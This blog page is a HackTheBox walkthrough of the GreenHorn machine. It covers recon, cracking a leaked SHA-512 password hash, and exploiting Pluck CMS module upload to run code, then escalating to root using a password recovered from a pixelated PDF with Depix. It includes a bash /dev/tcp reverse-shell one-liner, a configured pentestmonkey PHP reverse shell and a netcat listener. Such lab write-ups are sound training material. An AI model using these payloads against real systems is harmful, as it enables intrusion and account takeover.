---
layout: page
title: GreenHorn
description: GreenHorn from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/greenhorn/logo.png" title="HTB GreenHorn Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/GreenHorn">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
I learned quite a bit on this box.  Hopefully, you do to.  Let's go.

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.25 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 22:13 AEDT
Nmap scan report for 10.10.11.25
Host is up (0.011s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Golang net/http server

<snip>
```
{% endraw %}

<br />
Check the landing page for the webserver on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/landing80.png" title="Port 80 Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code of the webpage looking for any interesting little nuggets.

{% raw %}
```sh
view-source:http://greenhorn.htb/?file=welcome-to-greenhorn

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="generator" content="pluck 4.7.18" />
<title>Welcome to GreenHorn ! - GreenHorn</title>
<link href="/data/reset.css" rel="stylesheet" type="text/css" />
<link href="/data/themes/default/style.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="container">
	<div id="header">
		<h1 title="GreenHorn">GreenHorn</h1>
		<ul><li class="active" id="active"><a href="/?file=welcome-to-greenhorn" >Welcome to GreenHorn !</a></li><li><a href="/?file=welcome-the-new-junior" >Welcome the new junior !</a></li></ul>	</div>
	<div id="content">
		<h2 title="Welcome to GreenHorn !">Welcome to GreenHorn !</h2>
		<p>Dear Aspiring Web Developers,</p>
<p>Welcome to GreenHorn Web Development! We are thrilled to have you join our community dedicated to helping juniors kickstart their web development careers.</p>
<p>At GreenHorn, we believe in providing the resources and support you need to succeed in the exciting world of web development. Whether you're a fresh graduate, switching careers, or simply passionate about coding, you've come to the right place.</p>
<p>Our mission is to guide and empower you through your web development journey. You'll find a wealth of educational content, tutorials, hands-on projects, and a supportive network of fellow learners and experienced developers who are here to mentor and assist you along the way.</p>
<p>We're excited to see you grow, learn, and contribute to the web development community. The journey may have its challenges, but remember that every experienced developer was once a junior like you. Your dedication, curiosity, and hard work will lead you to success.</p>
<p>Feel free to explore our website, join our forums, and take advantage of the resources we offer. If you ever have questions, need advice, or just want to connect with like-minded individuals, our community is here for you.</p>
<p>Welcome to the world of web development. Let's code, learn, and grow together. Your future as a web developer starts here at GreenHorn!</p>
<p>Best regards,</p>
<p>Mr. Green</p>			</div>
	<div id="footer">
				<a href="/login.php">admin</a> | powered by <a href="http://www.pluck-cms.org">pluck</a>
	</div>
</div>
</body>
</html>
```
{% endraw %}

<br />
Check the login page and note the version of pluck.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/pluckver.png" title="Pluck Version" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the robots.txt file.

{% raw %}
```sh
User-agent: *
Disallow: /data/
Disallow: /docs/
```
{% endraw %}

<br />
Check the landing page for the webserver that is serving on port 3000.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/greenhorn.png" title="Landing Page Port 3000" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Register a new user.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/register.png" title="Register New User" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the swagger specs to get an idea of the APIs that are available for us to investigate.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/swagger.png" title="Swagger Specs" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Explore the repos that we have available to our user looking for anything interesting.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/explore.png" title="Explore Repos" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the repo.  Notice that it looks to be the pluck installation that is running on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/repo.png" title="Pluck Repo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Investigate the repo looking for some sort-of config file.  These usually contain passwords.  Come across pass.php.  Hey!  That looks like a hash.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/pass.png" title="pass.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Save the hash to the file.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$  echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' > hash
```
{% endraw %}

<br />
Run hash-identifier to identify the type of hash as SHA512.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ hash-identifier                                      
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
```
{% endraw %}

<br />
Use john the ripper to crack the password.  We will use the rockyou.txt wordlist and the raw-sha512 format.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ john --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou1        (?)     
1g 0:00:00:00 DONE (2025-02-11 19:08) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
--------------------------------------------------
```
{% endraw %}

<br />
Try the credentials in the login page that we discovered earlier as a part of the pluck site on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/login.png" title="Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the dashboard.  Look for anything interesting.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look up for a vulnerability for Pluck, version 4.7.18.  Follow the links indicated in the Packet Storm to get a full idea of how this exploit works.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/storm.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://packetstorm.news/files/id/173640">https://packetstorm.news/files/id/173640</a>

<br />
Create a test.php file the executes the phpinfo() function to test command execution.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ cat test.php 
<?php phpinfo(); ?>
```
{% endraw %}

<br />
When a exploit comes along, you must zip it.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ zip test.zip test.php
  adding: test.php (stored 0%)
```
{% endraw %}

<br />
Select options and click manage modules.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/manage.png" title="Manage Modules" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on Install Module.  Select the test.zip and upload our new "module."

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/installtest.png" title="Install Test Module" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Notice that the function executed.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/phpinfo.png" title="PHP Info" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ sudo nc -nlvp 443      
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Create a reverse shell in a php file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ cat shell.php              
<?php echo system(\"bash -c 'exec bash -i &>/dev/tcp/10.10.16.12/443 <&1'\")?>
```
{% endraw %}

<br />
When a something's going wrong, you must zip it.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ zip shell.zip shell.php                                          
  adding: shell.php (deflated 6%)
```
{% endraw %}

<br />
Upload that zip.  That malicious zip.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/uploadshell.png" title="Upload Shell" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Nope.  It didn't seem to like that at all.  No shell.  Seems like what we got here is...a failure to communicate.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/uploadshell.png" title="Upload Shell" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download pentestmonkey's php reverse shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
--2025-02-03 00:55:59--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 2606:50c0:8001::154, 2606:50c0:8003::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.02s   

2025-02-03 00:55:59 (243 KB/s) - ‘shell.php’ saved [5491/5491]
```
{% endraw %}

<br />
Update the scripts LHOST and LPORT to your attack machine.

{% raw %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.12';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>

?>
```
{% endraw %}

<br />
Zip it on up.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ zip shell.zip shell.php 
  adding: shell.php (deflated 59%)
```
{% endraw %}

<br />
Install the shell.zip module.  Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ sudo nc -nlvp 443      
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.25] 60994
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 13:57:52 up  3:24,  0 users,  load average: 0.06, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@greenhorn:/$
```
{% endraw %}

<br />
Change into the junior user using su and the password from the website.

{% raw %}
```sh
www-data@greenhorn:/var/lib/gitea$ su junior
su junior
Password: iloveyou1

junior@greenhorn:/var/lib/gitea$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
cat user.txt
<redacted>
junior@greenhorn:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:5c:7b brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.25/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:5c7b/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb9:5c7b/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run sudo -l to see what commands we can run as sudo.

{% raw %}
```sh
junior@greenhorn:~$ sudo -l
sudo -l
[sudo] password for junior: iloveyou1

Sorry, user junior may not run sudo on greenhorn.
```
{% endraw %}

<br />
Start a webserver.

{% raw %}
```sh
junior@greenhorn:~$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the pdf in the junior home folder to the attack machine.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ wget http://greenhorn.htb:8000/Using%20OpenVAS.pdf
--2025-02-11 16:16:02--  http://greenhorn.htb:8000/Using%20OpenVAS.pdf
Resolving greenhorn.htb (greenhorn.htb)... 10.10.11.25
Connecting to greenhorn.htb (greenhorn.htb)|10.10.11.25|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61367 (60K) [application/pdf]
Saving to: ‘Using OpenVAS.pdf’

Using OpenVAS.pdf                                          100%[========================================================================================================================================>]  59.93K  --.-KB/s    in 0.04s   

2025-02-11 16:16:02 (1.41 MB/s) - ‘Using OpenVAS.pdf’ saved [61367/61367]
```
{% endraw %}

<br />
View the pdf and note the blurred password.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/pdf.png" title="PDF" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Research on how to unblur the image.  You will notice a reference to two different programs.  One of programs is pdfimages in the poppler-utils package.  This is used to extract the blurry images.  The second program is depix to unblur the pixels.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/depix.png" title="Depix" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/spipm/Depixelization_poc/tree/main">https://github.com/spipm/Depixelization_poc/tree/main</a>

<br >
Run the pdfimages program against the pdf we took from the victim machine.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ pdfimages VAS.pdf ./vas-000.ppm
```
{% endraw %}

<br />
Clone the depix repository.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ git clone  https://github.com/spipm/Depixelization_poc.git
Cloning into 'Depixelization_poc'...
remote: Enumerating objects: 257, done.
remote: Counting objects: 100% (257/257), done.
remote: Compressing objects: 100% (130/130), done.
remote: Total 257 (delta 126), reused 244 (delta 118), pack-reused 0 (from 0)
Receiving objects: 100% (257/257), 878.27 KiB | 887.00 KiB/s, done.
Resolving deltas: 100% (126/126), done.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/greenhorn]
└─$ cd Depixelization_poc
```
{% endraw %}

<br />
Take a screen-print of the pdf and save it as a png.  We can use this as a sample of the fonts.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/pdfpng.png" title="PDF PNG" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try running depix and note that it fails.  Perform research about proper usage of the program.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/geekforgeeks.png" title="Geek for Geeks" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.geeksforgeeks.org/depix-recovers-passwords-from-pixelized-screenshots/">https://www.geeksforgeeks.org/depix-recovers-passwords-from-pixelized-screenshots/</a>

<br />
Run depix again and use the provide character set as the reference set.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn/Depixelization_poc]
└─$ python3 depix.py -p ../vas-000.ppm-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ../outputcas.png
2025-02-11 18:09:15,883 - Loading pixelated image from ../vas-000.ppm-000.ppm
2025-02-11 18:09:15,906 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2025-02-11 18:09:17,053 - Finding color rectangles from pixelated space
2025-02-11 18:09:17,055 - Found 252 same color rectangles
2025-02-11 18:09:17,056 - 190 rectangles left after moot filter
2025-02-11 18:09:17,056 - Found 1 different rectangle sizes
2025-02-11 18:09:17,056 - Finding matches in search image
2025-02-11 18:09:17,056 - Scanning 190 blocks with size (5, 5)
2025-02-11 18:09:17,123 - Scanning in searchImage: 0/1674
2025-02-11 18:11:13,643 - Removing blocks with no matches
2025-02-11 18:11:13,643 - Splitting single matches and multiple matches
2025-02-11 18:11:13,649 - [16 straight matches | 174 multiple matches]
2025-02-11 18:11:13,649 - Trying geometrical matches on single-match squares
2025-02-11 18:11:14,464 - [29 straight matches | 161 multiple matches]
2025-02-11 18:11:14,464 - Trying another pass on geometrical matches
2025-02-11 18:11:15,177 - [41 straight matches | 149 multiple matches]
2025-02-11 18:11:15,178 - Writing single match results to output
2025-02-11 18:11:15,179 - Writing average results for multiple matches to output
2025-02-11 18:11:20,494 - Saving output image to: ../outputcas.png
```
{% endraw %}

<br />
Check the outputcas.png picture to see the descrambled image.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/greenhorn/side.png" title="outputcas.png" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use the password in the output image to ssh into the server as root.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/greenhorn/Depixelization_poc]
└─$ ssh root@10.10.11.25
root@10.10.11.25's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Feb 11 07:14:15 AM UTC 2025

  System load:           0.0
  Usage of /:            63.3% of 3.45GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             237
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.25
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5c7b


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
root@greenhorn:~# cat root.txt
<redacted>
root@greenhorn:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:5c:7b brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.25/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:5c7b/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:5c7b/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
So, fun practicing unblurring.  I never did that before.  Hopefully, you enjoyed the walk-through.